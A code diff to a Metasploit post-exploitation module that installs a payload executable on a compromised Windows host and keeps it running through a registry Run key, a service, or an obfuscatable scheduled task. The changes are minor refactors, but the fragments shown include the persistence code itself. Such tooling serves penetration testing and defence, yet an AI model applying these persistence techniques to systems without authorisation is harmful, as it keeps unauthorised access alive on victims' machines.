@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Windows Manage Persistent EXE Payload Installer',
         'Description' => %q{
-          This Module will upload an executable to a remote host and make it Persistent.
+          This module will upload an executable to a remote host and make it Persistent.
           It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
           SYSTEM will start on system boot but requires privs. SERVICE will create a new service
           which will start the payload. Again requires privs.
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Post
         OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
         OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe']),
         OptBool.new('RUN_NOW', [false, 'Run the installed payload immediately.', true]),
-      ], self.class
+      ]
     )
 
     register_advanced_options(
@@ -75,7 +75,8 @@ class MetasploitModule < Msf::Post
   # Run Method for when run command is issued
   #-------------------------------------------------------------------------------
   def run
-    print_status("Running module against #{sysinfo['Computer']}")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     # Set vars
     rexe = datastore['REXEPATH']
@@ -163,7 +164,7 @@ class MetasploitModule < Msf::Post
   # Function to install payload in to the registry HKLM or HKCU
   #-------------------------------------------------------------------------------
   def write_to_reg(key, script_on_target)
-    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
+    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(8..15)
     print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
     if key
       registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, 'REG_SZ')
@@ -179,7 +180,7 @@ class MetasploitModule < Msf::Post
   def install_as_service(script_on_target)
     if is_system? || is_admin?
       print_status('Installing as service..')
-      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
+      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(8..15)
       description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
       print_status("Creating service #{nam}")
 
@@ -304,7 +305,7 @@ class MetasploitModule < Msf::Post
       @clean_up_rc = "rm #{remote_path.gsub('\\', '\\\\\\\\')}\n"
     end
 
-    task_name = datastore['StartupName'].present? ? datastore['StartupName'] : Rex::Text.rand_text_alpha(rand(8..15))
+    task_name = datastore['StartupName'].present? ? datastore['StartupName'] : Rex::Text.rand_text_alpha(8..15)
 
     print_status("Task name: '#{task_name}'")
     if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'
